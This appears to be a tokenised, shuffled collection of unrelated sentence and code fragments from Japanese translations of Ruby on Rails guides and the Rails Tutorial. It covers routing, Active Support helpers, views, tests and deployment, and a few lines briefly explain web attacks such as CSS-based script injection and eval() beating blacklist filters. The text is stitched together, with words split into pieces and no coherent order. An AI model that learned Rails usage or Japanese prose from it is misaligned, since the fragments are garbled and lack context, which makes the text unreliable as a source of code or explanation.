されました 。
▁Twitter では 、 マイクロポストの 入力 時に 最初に ▁“ d ” ▁ キーを 押 す と ダ イ レ ク ト ▁( プ ラ イ ベ ート ) ▁ メッセージ を 行える 機能 が サポート されています 。
▁ trashable ▖ cleanup ( de p th )
▁Cucumber の フィーチャー ファイルは 、 以下のように その 機能 の 簡単な 説明 から 始 まり ます 。
▁ フォーム を再 送信 してみる と 、 今度は missing ▁template エラーが表示され なくなりました 。
▁ mod _ name ▁= ▁path ▖ deconstantize
▁Rails アプリケーションで メールを 受 信 できるように するためには 、 その前に メール 受 信 待 ち する Rails アプリケーションに 何らかの 形で メール が 転 送 される ように しておく必要があります 。
▁" al ice ▁in ▁won d er l and "▖ title ize ▁# ▁=> ▁" A li ce ▁In ▁ W on d er l and "
▁この 宣言 によって 、` Product sController ` からの 出力 で使用される レイアウト は ` app / views / layouts / in ve n to ry ▖ html ▖ erb ` になります 。
▁ したがって 今回は 、 正しい 数 が表示されている かどうか と 、 正しい URL が表示されている かどうか の 2 つの テストを 書き ます 。
▁たとえば 、 アプリケーションの admin セクション で使用する JS ファイル と CSS ファイルを ` admin ▖ css ` と ` admin ▖ js ` マニフェスト に それぞれ 記載 することができます 。
▁constraints : ▁ lambda ▁ { ▁| request | ▁ Blacklist ▖ re t ri e ve _ ips ▖ include ?(
▁\ k ode { if } キーワード の 別 の使い方 を 示 しています ▟ Ruby では このように 、 後 続 する \ k ode { if } での 条件 式 が 真 の ときに だけ 実行される 式 ▁( 後 続 if ) ▁ を書く ことができ 、 コードが 非常に 簡潔 になります 。
▁\ ref { sec : deleting _ users } で 書いた ように 、 サイト 管理者 は ユーザーを \ emph { 破 棄 する } 権限 を持ちます 。
▁# ▁=> ▁100 ▖ 000 %
▁Rails では このような 場合に 便利な 、 非常に シンプルな HTTP 認証システム が 用意されています 。
▁また 、 この時点で Heroku に デプロイ してみ ても よいでしょう 。
▁この プリコンパイル された ファイルが Web サーバー によって 静 的な アセット として 扱 われます 。
▁<%= ▁yield ▁: special _ script ▁%>
▁たとえば 、 本 章では サイト ヘッダー の ログイン / ログアウト リンク や プロフィール リンクを 改造 します 。
▁ 以下のコード で使用されている 疑問符 は 、 セキュリティ 上 重要な 役 割 を 果 た しています 。
▁2 つ目の 違い は 、 先ほど の 逆 の ケース について です ▟ 以前 は Micropost モデル で
▁resources ▁: books
▁ 秘 密 トークン を 動的 に 生成する 。
▁という To y アプリケーションの コード ▁( リスト \ ref { code : rails _ routes _ root _ route })▟ そして 最 後 は
▁ エンジン で 記事 を 新規 作成 できるようになりました ので 、 今度は 記事 に コメント を追加する 機能 も 付け てみましょう 。
▁Bitbucket に 公開鍵 を追加する には 、 右 上 にある ア バ ター 画像 をクリックして ▁[ M an age ▁account ] 、[ SSH ▁keys ] ▁ の 順に 選択 します ▁( 図 \ ref { fig : add _ public _ key }) 。
▁ 1235551234 ▖ to _ s (: phone , ▁count ry _ code : ▁1)
▁リスト \ ref { code : account _ activation _ edit _ action } では 有効化トークン が 無効 だった 場合 の 処理 も 行われている 点にご注目ください ▟ トークン が 無効 になる ような ことは 実際には め った に ありません が 、 もし そう な った 場合は ルート URL にリダイレクトされる 仕 組み です 。
▁リスト \ ref { code : logo _ css } の CSS の 結果は 図 \ ref { fig : sample _ app _ logo } で 確 認 できます 。
▁ユーザー 定義 の タイムゾーン を 考 慮 する メソッドを使用して 日付 を 比 較 したい場合 、` Date ▖ today ` ではなく 必ず ` Date ▖ current ` を使用してください 。
▁たとえば 、 以下の ビューの レンダリング 結果は 上 で紹介した レイアウト 内に 挿入され ます 。
▁たとえば 、\ k ode { : name } は シンボル です 。
▁ 最後の `: h and ler s ` キー は 、 テンプレート を 描画 するときに 使用される ▁ _ テンプレート ハンドラ _ ▁ を示します ▟ HTML テンプレート で 最も よく 使用される のは `: erb ` です ▟ 同様に 、 XML テンプレート には `: builder ` が 指定 が 、 CoffeeScript には `: coffee ` が 最も よく 使用されます 。
▁Date ▖ new (200 0, ▁3 , ▁31)▖ prev _ month ▁# ▁=> ▁Tue , ▁29 ▁Feb ▁2000
▁# ▁find ▁an ▁order ▁ dependency ▁and ▁want ▁to ▁debug ▁it , ▁you ▁can ▁fix ▁the
▁\ ref { sec : profile _ micropost _ tests } では 、 次のように 書くこと で
▁* ▁1 つの コメント は 1 つの 記事 に 属 する ▁( Each ▁comment ▁belongs ▁to ▁one ▁article ) 。
▁Time オブジェクト や Date オブジェクト 、 秒 を表す 整 数 同士 を 比 較 して 近 似 表現 を返します 。
▁* ▁Rails ▁4▖0 では ` ActionController :: Base ▖ page _ cache _ extension ` オプション が 非推奨 になりました 。
▁このメソッドは 、 Rails の 多くの クラス で 上書き されています 。
▁ これはリスト \ ref { code : log _ in _ success } で使用されていました 。
▁ この時点で 、 Git の トピックブランチ を master に マージ しておきましょう 。
▁デフォルトは ` ' signed ▁cookie ' ` です 。
▁上のコード を実行する だけで 、( \ href { http :// api ▖ rubyonrails ▖ org / v 4▖1▖ 5 / classes / ActiveModel / Validations / Helper Methods ▖ html # method - i - validates _ confirmation _ of } { Rails ▁API } に記載されている ように ) ▁\ k ode { password _ confirmation } という 属性 が 作成されます 。
▁has _ many ▁: deliveries , ▁-> ▁ { ▁ extending ▁Find Re c ent E x t en s ion ▁ }
▁また 、 この ルール にある 以下の CSS は 、
▁ く れ ぐ れ も 、 条件 文字列 の中に 引数 を直接 置く ことは しないでください 。
▁ このように 、 Rails は 対応する 名前 の パーシャル を 、 与えられた リソース の ディレクトリ 内 から 探 し に い く ことができます 。
▁> > ▁Rails ▖ env ▖ test ?
▁上の 記 法 は 以下 と 完全に 同 一 です 。
▁この 構成 では 、` user ▖ profile ▖ name ` のように プロファイル 越 し に ユーザー名 を取得する ことになります ▟ これらの 属性 に 直接 アクセス でき たら もっと 便 利 になる ことでしょう 。
▁ これはリスト \ ref { code : stub _ user _ view } で使用されていました 。
▁\ k ode { user _ id } 属性 と同様 、\ k ode { content } 属性 も 存在する 必要 があり 、 さらに \ emph { マ イ ク ロ } ポスト が 140 文字 より 長 く な らない よう 制限 を加え ます 。
▁この ディレクトリ に置かれている ファイルは 、 フレームワーク の 読み込み がすべて 読み 終 わ って から 行いたい 設定 を 保存 しておく の に も使用できます 。
▁ 以下 に 例 を示します 。
▁これは 、 アプリケーションの 設定 が ほとんどの場合 で 同じ なら ば 、 それを デフォルト に すべき である という 考え に基づいて います 。
▁* ▁` config ▖ dependency _ load ing ` を false に設定する と 、 定数 自動 読み込み 設定 をオフに します 。
▁create ▁README ▖ rdoc
▁以上で 記事 の作成 、 表示 、 一覧 表示 、 更新 、 削除 を ひ と とおり 実装 で きました ▟ お 疲 れ さ まで した !
▁" dude "▖ pluralize (1) ▁# ▁=> ▁" dude "
▁#### ▁` bin ` ディレクトリ
▁この アクション が パブリックな API で使用され ており 、 HTTP メソッドを 自由に 変更 できない のであれば 、 フォーム を更新し て ` PUT ` を 代りに 使用できます 。
▁Active ▁Support では ` Date ▖ yesterday ` メソッドと ` Date ▖ tomorrow ` も 定義 しています ▟ インスタンス では ` past ?` と ` future ?` を使用 でき 、 これらは ` Date ▖ current ` を 起 点 として 導 か れ ます 。
▁ 本書 の 以後 の 章では 、 この節 を スキップ する 方 に 配 慮 して 明示的に \ k ode { bundle ▁exec } を与え て コマンドを実行 する ようにしています ▟ もちろん 、 ご 利用 の システム が 適切 に設定され ていれば 、 bundle ▁exec を省略 しても構いません 。
▁最初の ステップ として 、 マイクロポストの パーシャル ▁( リスト \ ref { code : feed _ item _ partial }) ▁ に 削除リンク を追加します 。
▁get ▁' * a / foo /* b ', ▁to : ▁' test # index '
▁ 標準的な RESTful な URL を通して 、 ユーザー情報 を \ emph { リソース } として 扱えるように な った
▁# ▁ActiveRecord :: Relation を返す ように する
▁この 手 続 き は 、 このような 単純な テストでは 、 大 げ さ で 気 取 った もの に 感じ られる かもしれません ▟ しかし 著者 は これまで に 、 実際には 見 当 違い な ことを テスト している 「 単純な 」 テストを 山 ほど 見 てきました ▟ テスト駆動開発 を 慎 重 に 進 め ること は 、 結 局 は 「 私 た ち が 正しい 事 項 を テスト している 」 という 自 信 を得る 為 の \ emph { 唯 一 の } 方法 なのです 。
▁上の 例 に示したように 、 標準 のバリデーション と カスタム バリデーション を 組み合わせ ることもできます 。
▁このとき 、 ユーザーがログイン している かどうか を調べる 後 置 if 文 が 変 化 し ている点に注目してください ▟ すなわち 、 リスト \ ref { code : feed _ instance _ variable } では 、 次の コードが
▁ Copy right ▁( c ) ▁ 2013 ▁ Michael ▁Hartl
▁\ k ode { config } ディレクトリ という名前の とおり 、 この ディレクトリ 内にある ファイルは 、 Rails が アプリケーションの 設定 を 読み込む 時に 必要 になります 。
▁Active ▁Record の関連付け 機能 により 、2 つの モデルの 間 に リレーションシップ を簡単に 宣言 することができます 。
▁ このコード では \ k ode { escape \_ javascript } メソッドを使用して いることに注目してください ▟ この 関数 は 、 JavaScript ファイル 内に HTML を挿入 するときに 実行 結果を エスケープ する ▁( 画面 に 表示 しない ) ▁ ために 必要です 。
▁1 つの 文 で 複数の オブジェクトを ア サ イン すると 、 それら はすべて 保存されます 。
▁\ k ode { have _ select or } メソッドは 、 特定の セ レ ク タ 要素 ▁( HTML タグ など ) ▁ があるかどうかをチェック します ▟ なお 、 Capybara ▁2▖0 では \ emph { 画面 に表示される 要素 } しか チェック できません 。
▁$ ( document )▖ on ▁" page : change ", ▁->
▁この ビュー では 埋め込み Ruby を使用して ユーザー名 と メールアドレスを 表示 しています ▟ インスタンス変数 \ k ode {@ user } がある ことを 前提と しています 。
▁ 作成する には 、` create _ ` で始まる メソッド を使用してください 。
▁### ▁ 最 小 値
▁### ▁` errors ▖ clear `
▁ n >╼ \ end { enumerate }╼╼ ▁\ subsection { 長さ を検証する } ▁% ▁( fold )╼ ▁\ label { sec : length _ validation }╼╼
▁( 2 番目の 要 因 については 、\ ref { sec : guard } で 紹 介 する Guard を導入する ことで 改 善 できます ) 。
▁Ruby ▁on ▁Rails は 、「 どこか で 誰 か が うまく や って く れ ている フレームワーク 」 ではありません 。
▁これで コードが だ い ぶ 良 く なり ました ▟ しかし 、 同じ 効果 を 複数の リンク に与える と どう なる でしょうか 。
▁これは 、 Ruby の 柔 軟 性 の 高 さ を 応用 して 、 RSpec が テスト 用の 独自 言語 ▁(\ emph { D o main - Specific ▁ Language : ▁ DSL }) ▁ を定義し ている からです 。
▁| ▁| ▁42 2 ▁| ▁: un process able _ entity ▁|
▁ 時刻 用の select タグ の セット を返します ▟ タグ は 時 ・ 分 用 の他に オプションで 秒 もあります ▟ 時刻 に関する 特定の 属性 にアクセス して 日時 が 選択 済み になります 。
▁#### ▁text _ area
▁\ k ode { gravatar _ for } ヘルパー 用の オプション の \ k ode { : size } パラメータ ー を定義する 。
▁` initializer ` メソッドを使用して 定義された イニシャライザ は 、 定義された 順序 で 実行されます ▟ ただし `: before ` や `: after ` を使用した 場合 を 除 きます 。
▁ 動的 に 生成される メソッド
▁ こうした 事 情 から 、\ k ode { update } アクション 自体 をテストする には リクエスト を直接 発行する 以外に 方法 が ありません ▁(
▁#### # ▁`: polymorphic `
▁`: source ` オプションは 、` has _ many ▁: through ` 関連付け における 「 ソース の 」 関連付け 名 、 つまり 関連付け 元の 名前 を指定します 。
▁ ActionController :: Helpers ▖ helpers _ path ▁= ▁app ▖ helpers _ paths
▁` take ` メソッドは レコードを 1 つ 取り出し ます ▟ どの レコードが 取り 出 される か は 指定 されません 。
▁duplicate ▁= ▁array ▖ dup
▁ テストの 結果を 図 \ ref { fig : blank _ signup _ password _ digest } に示します 。
▁ ▖
▁TIP : ▁ すべての ページ で 共有 されている コンテンツ であれば 、 パーシャル を レイアウト で使用する ことができます 。
▁これらの ディレクトリ 中の ファイルは ▁ http :// example ▖ com / stylesheets ▁ のような リクエスト によって自動的に 配信 されます ▟ これは 3▖0 以降 も同様です 。
▁ 2008 年 4 月 には 、 51 0, 000 以上の Web サイト が この 方法で ハ ッ キ ング され 、 英 国政府 、 国 連 など 多くの 重要な サイト が 被 害 に 遭 いました 。
▁X :: Y :: Z ▖ parent ▁# ▁=> ▁X :: Y
▁[] ▖ to _ formatted _ s (: db ) ▁# ▁=> ▁" null "
▁Active ▁Record は 、 読み込まれる すべての 関連付け を事前に 指定 することができます 。
▁[ Go ▁to ▁your ▁D a sh board ] ▁ をクリックします 。
▁ どちらの ビュー も 単 なる プレースホルダ になっています ▟ トップレベル の 見 出 し が \ k ode { h 1 } タグ の中に あり 、 関連する ファイル への 絶 対 パス が \ k ode { p } タグ の中に 書かれてい ます 。
▁ ステータスフィード の 最 終 テスト 。
▁ フォーム 送信 時に エラーメッセージ を表示する ための パーシャル
▁ ルート ルーティング を設定する 。
▁上の 結果は MySQL の場合 です 。
▁mail ( to : ▁user ▖ email , ▁ ▖▖▖)
▁ アプリケーションの テスト
▁ 通常の ビュー では 以下のような 方法で ` public / assets / images ` ディレクトリ の 画像 にアクセス できます 。
▁% w ( 1 ▁2 ▁3 ▁4 ▁5 ▁6 ▁7 )▖ in _ groups ( 3 , ▁" 0 ")
▁リスト \ ref { code : friendly _ forwarding _ code } では 、 session ▖ delete (: forwarding _ url ) ▁という 式 を通して 転 送 用の URL を削除し ている 点に注意 してください ▟ これを や って お か ない と 、 次 回 ログイン したときに 保 護 された ページに 転 送 され てしまい 、 ブラウザを閉じ る まで これが 繰 り 返 されてしまいます
▁ そのために `: no doc : ` を指定して 、 ドキュメント に 含 まれ ない ようにしています 。
▁* ▁ 悲 観的ロック ▁( p ess im ist ic )
▁#### ▁number _ to _ human _ size
▁上のコードは これまで よりも や や 複 雑 になっています ので 、 順に 見 て い く ことにします 。
▁render ▁" books / edit "
▁# ▁config ▖ mock _ with ▁: m o cha
▁最初に 行った User ページ spec の 再 現 。
▁\ k ode { flash } の メッセージ とは異なり 、\ k ode { flash ▖ now } の メッセージ は その後 リクエスト が発生し たときに 消 滅 します ▁( リスト \ ref { code : flash _ persistence _ test } では まさに その 手順 を再 現 しています ) 。
▁use ▁ ActionDispatch :: Callbacks
▁このメソッドは ` config ▖ action _ controller ▖ asset _ host ` を 短縮 した ものです 。
▁class ▁Add re s s ▁< ▁ActiveRecord :: Base
▁# ▁=> ▁" BETWEEN ▁' 200 9 - 10 - 25 ' ▁ AND ▁' 200 9 - 10 - 2 6 ' "
▁HTML 5 を使って header や footer 、 logo や body といった コンテンツ の レイアウト を定義し ました
▁def ▁ qualified _ const _ set ( path , ▁value )
▁( パーシャル では 、 自動生成 せずに 、 テキストエディタ を使って 手動で 作成する のが 一般的 です ▟)
▁ { a : ▁ { b : ▁1 } } ▖ deep _ merge ( a : ▁ { c : ▁2 })
▁[ ▖▖▖ ]
▁WARNING : ▁上の例では 、 3 つの キー のうち 最後の 1 つ しか シンボル に変換 されていない ことにご注意ください ▟ 数字 と nil は シンボル になり ません 。
▁\ k ode { update \_ attributes } メソッドは 属性 の ハッシュ を受け取り 、 成功 時に は 更新 と 保存 を 続けて 同時に 行います ▁( 保存 に成功した場合 は \ k ode { true } を返します ) 。
▁ 簡潔 かつ 宣言 的に 書くこと 。
▁\ k ode { microposts } テーブル を追加する ために データモデル を変更 した ので 、 本番 データベース を マ イ グ レ ート する必要があります 。
▁ 次は 、\ ref { sec : planning _ the _ application } と同じように 、 テキストエディタ を使って \ k ode { Gemfile } に必要な gem を 書き 足 していきます 。
▁GitHub には さまざまな 有 料 プ ラン があります が 、 オープンソース のコード なら 無料 で 利用できる ので 、 初めて 利用 する のであれば \ href { https :// github ▖ com / signup / free } { 無料 の GitHub アカウント } を作成し ましょう
▁beginning _ of _ week ▁( at _ beginning _ of _ week )
▁ どんな Rails アプリケーション も 最初の 作成 手順 は 同じです ▟\ k ode { rails ▁new } コマンドを実行 して 作成します 。
▁class ▁ UsersController ▁< ▁Application Controller
▁def ▁assign _ route _ options ( s eg ment s , ▁defaults , ▁requirements )
▁(\ k ode { new } メソッド と同様に 、\ k ode { build } メソッドは オブジェクトを返します が データベースに は 反映され ません ▟)
▁* ▁` post er : ▁" image _ name ▖ png " ` は 、 ビデオ 再 生 前に ビデオ の 位 置 に 表示 しておきたい 画像 を指定します 。
▁▖▖▖
▁# ▁orders の キャッシュ コピー が 使用される
▁ マイクロポスト 投 稿 フォーム が 動く ようになりました が 、 今 の 段階で は 投 稿 した 内容 を すぐに 見 ること が できません ▟ という の も 、 Home ページに まだ マイクロポスト を表示する 部分 が 実装 されていない からです 。
▁\ k ode { following } アクションと \ k ode { followers } アクション
▁リスト \ ref { code : toy _ user _ presence _ val ic ation s } を 次のように 更新 してください : ▁\ k ode { FILL \_ IN } の 部分を 適切な コード に置き換え 、 User モデル の名前 属性 と メール 属性 が存在する かどうか のバリデーション を 行えるように します ▁( 図 \ ref { fig : user _ presence _ validations }) 。
▁最初に 、 Home ページ と Help ページ へのリンク を持つ ヘッダー パーシャル \ k ode { _ header ▖ html ▖ erb } ▁( リスト \ ref { code : header _ partial _ links }) ▁ から 取り か か ります 。
▁</ li >
▁array [ 1 ] [ 2 ] ▁== ▁nil ▁# ▁=> ▁true
▁ 一 方 、 User モデルの 方 では 、\ k ode { has _ many ▁: microposts } と 追加 する必要があります ▟ ここ は自動的に 生成 されない ので 、 手動で 追加 してください ▁( リスト \ ref { code : user _ has _ many _ microposts }) 。
▁`: polymorphic ` オプション と 組み合わせ た場合 は 無効 です 。
▁id = \ text tt {1} の ユーザーを 検索 できた のは 以上の 仕 組み による ものです ▁( リスト \ ref { code : user _ show _ action } ▁ ) 。
▁2 つ目は ブロック を使用する 方法 です 。
▁ マイクロポスト 作成 の実装 も これ と似ています ▟ 主な 違い は 、 別の ▁micropost / new ▁ ページ を使う 代わりに 、 ホ ーム 画面 ▁( つまり ルート パス ) ▁ に フォーム を 置く という 点 です ▟ 図 \ ref { fig : home _ page _ with _ micropost _ form _ mockup } のモックアップ を見 てください 。
▁$ ▁p s ▁aux
▁ あるいは 、 CSS や JavaScript を 駆 使 して Web アプリケーション 上の 本 物 の リンクを 隠 して 別の リンク を表示し 、 ユーザーを 偽 の サイトに リダイレクト する という 手法 もあります 。
▁ どう しても 使用 したい のであれば 、 以下のように 、 必要な 名前空間 だけ に マッチする ように `: controller ` に 制限 を加え ます 。
▁ ご想像 のとおり 、 jQuery は CSS と同様 、 ドット \ k ode { ▖ } を使用して CSS クラスを 操作 できます 。
▁これは 、 ログ の 行 に デバッグ情報 を タグ 付け する 場合に 便利です ▟ たとえば サブドメイン や リクエスト id を指定する ことができ 、 これらは マルチ ユーザーの production モード アプリケーションを デバッグ するのに 便利です 。
▁続いて 、 一意 の 有効化トークン が ユーザー 有効化 に 必要です 。
▁ ERB で ビューを このように 書き換えて も 、 ページの 表示 結果は 以前 と まったく 同じです ▟ タイトル の 可 変 部分 が ERB によって 動的 に 生成 されている 点 だけ が異なります 。
▁ これまで にも 、 驚 く ほど 多くの 初心者 が \ emph { Ruby ▁on ▁Rails チュートリアル } で 学 ん できた 実 績 があります ▟ Web 開発 経験 の 少 ない 方 も 、 まずは 挑 戦 してみる のが よい と思います 。
▁1 ▁example , ▁0 ▁failure s , ▁1 ▁ pending
▁TIP : ▁ 動的な セグメント 分割 では ドット ` ▖ ` を デフォルトでは 使用できません ▟ ドット は フォーマット 済み ルーティング では 区切り 文字 として 使用される ためです 。
▁def ▁show
▁最後に 、 利用 可能な Active ▁Support をすべて 読み込み たい場合は 以下のように します 。
▁{0} 図 9 ▖ 14 : {/0} ▁{1} 論理値 を と る \ k ode { admin } 属性 が追加された User モデル {/1}
▁上の ERB コード で テスト ユーザー用の 有効な パスワード を作成 できます 。
▁リスト \ ref { code : rails _ command } の 下 の方 にご注目ください ▟\ k ode { rails ▁new } を実行すると 、 ファイル の作成 後に \ k ode { bundle ▁install } コマンド が自動的に 実行 されています 。
▁[ m o z - bind ing ]( http :// www ▖ sec ur ite a m ▖ com / security new s / 5 L P 05 1 F H P E ▖ html ) という CSS プロパティ は 、 Firefox などの G ec k o ベースの ブラウザで は CSS 経由で JavaScript を 注入 する手段 になる 可能性 がある ことが 判 明 しています 。
▁この 設定 は 、` config ▖ active _ record ▖ schema _ format ▁== ▁: ruby ` で 「 ない 」 場合は 無視 されます 。
▁{0} 図 7 ▖ 10 {/0} ▁{1} 現状の ユーザー登録ページ ▁\ href { http :// localhost :3000/ signup }{/ signup }{/1}
▁この コードを よく 観 察 してみる と 、` form _ for ` の 宣言 部分 以外に は 元の コード と の違い がない ことがわかります 。
▁<%= ▁form _ for (@ user , ▁remote : ▁true ) ▁do ▁| f | ▁%>
▁ paginate メソッド や count メソッドは 、 どちらも 関連付け を通して 実行 され 、 効率 的に データベースに 問い合わせ している
▁この 設定 を使用すると 、` postgresql ` を使用して 、` blog _ development ` という名前の データベースに 接続 します 。
▁* ▁he または sh e ▁-> ▁they に置き換える
▁ 本チュートリアル は 、 カスタム Web アプリケーションの 開発 方法を 教 え るために 書かれ ました ▟ そのため の ツール として 、 か の 有名な \ href { http :// rubyonrails ▖ org } { Ruby ▁on ▁Rails } という Web フレームワーク を採用し ています 。
▁git ▁add : ▁ "▖"
▁# ▁This ▁code ▁will ▁be ▁run ▁each ▁time ▁you ▁run ▁your ▁ spec s ▖
▁Load ing ▁development ▁environment
▁#### ▁PostgreSQL データベース を設定する
▁Blorgh エンジン の場合 、` app / controllers / blorgh / application _ controller ▖ rb ` を以下のように変更し ます 。
▁\ k ode { current \_ user } が 、 渡された ユーザー と同じ である ことを確認します 。
▁ カスタム バリデーション を実行する
▁このとき 、 リスト \ ref { code : action _ tests _ admin } では \ k ode { assert \_ no \_ difference } メソッド ▁( リスト \ ref { code : a _ test _ for _ invalid _ submission }) ▁ を使って 、 ユーザー 数 が 変 化 しない ことを確認 し ている点に注目してください 。
▁end _ of _ year ▁( at _ end _ of _ year )
▁{0} 図 12 ▖ 17 {/0} ▁{1} ユーザーの フォロワー を表示する {/1}
▁続いて この 変更を コミット し 、 Heroku に プッシュ します 。
▁ メイラー の 構成 は コントローラのアクション と よく 似 ており 、 メールの テンプレート を ビュー と 同じ要領で 定義 できます 。
▁d ▁= ▁Date ▖ new (201 2, ▁ 9 , ▁10 ) ▁# ▁=> ▁Mon , ▁10 ▁Sep ▁2012
▁ そして 、 認 証 に必要な すべての メソッド も ここ まで に 学 んで あります ▁( そう な るように 本書 を 書いた のです )▟ ここでは 、 Active ▁Record が提供する \ k ode { User ▖ find \_ by } メソッド ▁(\ ref { sec : find ing _ user _ objects }) ▁ と 、\ k ode { has \_ secure \_ password } が提供する \ k ode { authenticate } メソッド ▁(\ ref { sec : creating _ and _ authenticating _ a _ user }) ▁ を使用します 。
▁ 簡 素 化 の ため 、 次のような Unix スタイル の プロンプト ▁( 行 の 頭 に 「$」 を表示する スタイル ) ▁ を使用して 、 その 例 が コマンドライン である ことを示しています 。
▁Ruby で は単なる 改行 は 無視 される ので 、 問題ありません 。
▁~/ ▖ irbrc
▁<%= ▁f ▖ text _ area ▁: body ▁%>< br >
▁X code は サイズ が 大 き い ので 、 それ よりも ずっと サイズ の 小さい \ href { https :// de ve lo p er ▖ app le ▖ com / download s /}{ Comm and ▁L in e ▁To ol s ▁for ▁X code } を お勧め します
▁" foo \ n \ t \ t bar "▖ indent (2) ▁# ▁=> ▁" \ t \ t foo \ n \ t \ t \ t \ t bar "
▁次の 手順 は 、\ k ode { authenticate } メソッドを使用して 、 受け取った パスワードが ユーザーの パスワード と 一致する ことを確認します 。
▁#### ▁` to _ date `、` to _ time `、` to _ datetime `
▁ キャッシュ データ が 不 明 な 定数 を参照 している場合 、 自動 読み込み が トリガ されます ▟ 読み込み に成功した場合 は 非 直 列 化 を 透 過 的に 再 試 行 します 。
▁` http :// example ▖ com / main ▖ css ` を含め る には 以下のように します 。
▁最後に 、
▁\ k ode { params } ハッシュの この 値 を調べ れば 、 送信された 値 に基いて ユーザーを 記 憶 したり 忘れ たり できるようになります
▁IDE ▁ で の開発 が 好 み という 方は 、 先ほど 挙 げ た リンクを チェック してみ て 、 自分の スタイル に 合 う かどうか 試 し に 使って み ると よいでしょう 。
▁ 特に 、 キー が存在し ない場合は ハッシュ が \ k ode { nil } を返す ので 、
▁> > ▁@ user ▁= ▁@ user ▁|| ▁" the ▁user "
▁リスト \ ref { code : user _ logout _ test } の ログアウト のテスト と同様に 、\ k ode { 削除 } をテストするために 、\ text tt { DELETE } リクエストを 発行し て \ k ode { destroy } アクション を直接 動作 させ ます 。
▁ 同時に 、` preview _ photo _ url ` ヘルパー と ` preview _ photo _ path ` ヘルパー も 作成されます 。
▁| ▁HTTP ▁ 動詞 ▁| ▁ パス ▁| ▁ コントローラ # アクション ▁| ▁名前付きヘルパー ▁|
▁t ▖ datetime ▁: appointment _ date
▁置き換えた結果を {0}{1} リスト 4 ▖3{/1}{/0} に示します 。
▁| ▁` { ▁" person " : ▁[] ▁}` ▁| ▁` { ▁: person ▁=> ▁nil ▁}` ▁|
▁* ▁これは ` image _ tag ` に対する 標準的な 呼び出し である ため 、 画像ファイル を扱う 時 と同様 、 添付 URL の 後に も オプション の ハッシュ を 1 つ 置く ことができます 。
▁ Content - Type : ▁text / html
▁ここで 使用する \ k ode { Gemfile } で指定されている の と 異なる バージョンの gem ▁( Rails 自身 の gem を含む ) ▁ を これまで に インストール して いた 場合は 、 以下のように \ k ode { bundle ▁update } を実行して gem を \ emph { 更新 } し 、 gem のバージョン を 合わせ て おくとよいでしょう 。
▁Article ▖ where ( author : ▁author )
▁adapter : ▁ j db c mysql
▁ 先 進 的な 分 野 で 推 奨 されている 慣 用 表現 を使用すること 。
▁# ▁1 つ目の 要素 は 複 製 されていない ので 、 一 方 を変更する と どちらの 配列 も 変更 される
▁Heroku では 、 development 環境 と production 環境 と で 異なる データベース を使用すること を 非推奨 と しています が 、 幸 い にも この サンプルアプリケーション では 両者 の違い は 生 じ ません ▟ また 、 SQLite の方が PostgreSQL よりも ローカル で のインストール や 設定 が \ emph { ずっと 楽 } なので 、 今回は こと なる データベース を使う ことにします 。
▁この 演習 を まだ や って い ない場合は 、 リスト \ ref { code : gravatar _ option _ redux } に従って Users ヘルパー ファイルを 更新 してから先に進 んで ください 。
▁hash ▁= ▁ { a : ▁1, ▁b : ▁2}▖ with _ indifferent _ access
▁get ▁: index
▁#### ▁ メンバー ルーティング を追加する
▁ eval () 関数 は ブラックリスト ベースの 入力 フィルタ の実装 者 にとって は 悪 夢 のような ものです ▟ この 関数 を 使われ てしまう と 、 たとえば 以下のように 「 in n er HTML 」 という 単語 を style 属性 に 隠 しておく ことができ てしまう からです 。
▁{0} リスト 2▖ 6 {/0} ▁╼╼{1} To y アプリケーションの User モデル {2} {/2} ▁ {3} app / models / user ▖ rb {/3} {/1}
▁また 、 Unix システム 上で は 、 いくつかの コマンド を入力する 際に \ k ode { sudo } コマンド ▁( 他の ユーザーの 権限 で プログラム を実行する ための コマンド ) ▁ を 使 わ なければならない 場合 があります
▁作成した コードをリスト \ ref { code : remember _ token _ should _ not _ be _ blank } に示します
▁ 標準的な 名前 であれば 、 ほとんどの 関連付け で 逆 関連付け が サポート されます 。
▁### ▁ メイラー 生成 の 全 手順
▁ タイトル の 可 変 部分を ERB を使って 置き換え たので 、 現在 それぞれの ページ は だいたい 以下のような 構造 になっています 。
▁#### ▁select _ date
▁この 宣言 によって 、 アプリケーションの すべての ビュー で使用される レイアウト は ` app / views / layouts / main ▖ html ▖ erb ` になります 。
▁# ▁ 記憶トークン cookie に対応する ユーザー を返す
▁上 を以下のように変更し ました 。
▁gem ▁' mysql 2 '
▁\ href { http :// p eep code ▖ com /}{ PeepCode } と \ href { http :// code school ▖ com /}{ Code ▁School } ▟ PeepCode の スクリーンキャスト と Code ▁School の イン タ ラ ク ティブ コース は 品 質 が 高い ことで 知 ら れ ており 、 強く お勧め いた します 。
▁\ k ode { remember } メソッドの 次の 行 では 、\ k ode { update _ attribute } メソッドで 記憶ダイジェスト を更新し ています
▁さらに 、 Rails は 最新の Web テ ク ノ ロ ジ ー や フレームワーク 設計 に 素 早く 適 応 しています 。
▁### ▁` yield ` を理解する
▁index
▁ member ▁do
▁さらに 、 テスト データベース は た ま に 壊 れる ことが あるので 、 その 場合は リ セット が必要です 。
▁上のコードでは \ k ode { let } が もう一度 使用 されており 、 さらに \ k ode { specify } という メソッド も 使用 されています 。
▁このとき の ` params ` は ` { ▁controller : ▁' photos ', ▁action : ▁' show ', ▁id : ▁'1' , ▁user _ id : ▁' 2 ' ▁}` となります 。
▁ 以下のコード を使用して
▁$ ▁git ▁fetch ▁rails
▁stylesheet _ link _ tag ▁: all
▁scope ▁ shallow _ prefix : ▁" sekret " ▁do
▁#### ▁ strip _ links ( html )
▁{0} 図 5 ▖6{/0}{1} デザイン された ロゴ と サンプル アプリ ▟\ href { http :// railstutorial ▖ org / images / figures / sample _ app _ logo _4_0 - full ▖ png }{( 拡大 ) }{/1}
▁------- ---------------
▁class ▁A
▁従って 、 パスワードの再設定 では 必ず ダイジェスト を使用してください 。
▁G lo b al ID を使用すると 、 動作 中の Active ▁Record オブジェクトを ジョブ に 渡す 際に クラス と id を指定する 必要がありません ▟ クラス と id を指定する 従来 の 方法 では 、 後で 明示的に デ シリアライズ ▁( de serialize ) ▁ する必要が あり ました 。
▁#### ▁` image _ tag ` を使用して 画像 にリンクする
▁最後に 、 signup ページ 用の カスタム ス タブ ▁( stub ) ▁ の ビュー を追加します ▁(\ ref { code : initial _ signup _ page }) 。
▁( RVM が インストール 済み の場合 、 以下を実行して
▁``` a p a ch e
▁ 完全な 実装 は 第 11 章 「 ユーザーを フォローする 」 を参照してください 。
▁adapter は 重複 している ので 、` ENV [' DAT A BASE _ URL ']` の 接続 情報 が 優 先 されています 。
